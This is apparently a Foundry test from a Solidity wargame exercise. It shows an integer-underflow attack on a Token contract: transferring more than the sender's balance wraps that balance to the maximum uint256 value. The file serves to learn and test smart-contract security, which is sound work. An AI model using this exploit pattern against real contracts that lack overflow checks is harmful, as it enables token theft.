// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

contract TelephoneTest is Test {
    Token public token;

    address alice = address(1);
    address chris = address(2);

    function setUp() public {
        token = new Token(20 ether);
    }

    function testAttack() public {
        token.transfer(alice, 20 ether + 1);

        assertEq(token.balanceOf(address(this)), uint256(-1));
        assertEq(token.balanceOf(alice), 20 ether + 1);
    }
}
